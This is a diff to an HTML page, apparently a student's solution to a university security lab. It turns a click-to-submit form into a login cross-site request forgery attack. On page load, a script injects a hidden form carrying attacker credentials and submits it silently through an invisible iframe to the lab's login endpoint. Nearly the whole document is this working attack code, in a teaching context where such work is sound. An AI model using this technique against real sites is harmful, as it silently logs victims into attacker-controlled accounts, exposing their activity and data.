@@ -5,15 +5,21 @@
     <meta charset="UTF-8">
 </head>
 
-<body>
+<body onload="evilAction();">
 
-<form action="http://bungle-cs461.csl.illinois.edu/login" method="POST" target="YouCannotSeeMe">
-    <input type="hidden" id="username" name="username" value="attacker"/>
-    <input type="hidden" id="userpass" name="password" value="l33th4x"/>
-    <input type="submit" formaction="http://bungle-cs461.csl.illinois.edu/login" value="Click me!!!"/>
-</form>
+<script>
+    function evilAction() {
+        document.body.innerHTML
+            += '<form id="evilForm" method="POST" target="YouCannotSeeMe"' +
+            ' action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5">' +
+            '<input type="hidden" id="username" name="username" value="attacker"/>' +
+            '<input type="hidden" id="userpass" name="password" value="l33th4x"/>' +
+            '</form>' +
+            '<iframe name="YouCannotSeeMe" hidden></iframe>';
 
-<iframe name="YouCannotSeeMe" hidden></iframe>
+        document.forms["evilForm"].submit();
+    }
+</script>
 
 </body>
 </html>
